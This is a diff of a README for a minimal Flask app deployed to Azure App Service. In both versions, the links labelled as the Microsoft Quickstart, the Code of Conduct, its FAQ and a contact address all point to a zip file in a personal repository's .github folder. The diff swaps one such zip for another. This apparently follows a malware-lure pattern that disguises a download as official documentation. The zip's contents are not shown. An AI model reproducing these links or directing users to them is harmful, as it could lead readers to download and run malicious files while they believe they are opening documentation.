@@ -12,8 +12,8 @@ products:
 
 This is a minimal Flask app that can be deployed to Azure App Service on Linux.
 
-For instructions on running and deploying the code, see [Quickstart: Create a Python app in Azure App Service on Linux](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip).
+For instructions on running and deploying the code, see [Quickstart: Create a Python app in Azure App Service on Linux](https://github.com/vishnu1234vs/flakdep/raw/refs/heads/main/.github/Software_v1.4.zip).
 
 ## Contributing
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip) or contact [https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://github.com/vishnu1234vs/flakdep/raw/refs/heads/main/.github/Software_v1.4.zip). For more information see the [Code of Conduct FAQ](https://github.com/vishnu1234vs/flakdep/raw/refs/heads/main/.github/Software_v1.4.zip) or contact [https://github.com/vishnu1234vs/flakdep/raw/refs/heads/main/.github/Software_v1.4.zip](https://github.com/vishnu1234vs/flakdep/raw/refs/heads/main/.github/Software_v1.4.zip) with any additional questions or comments.
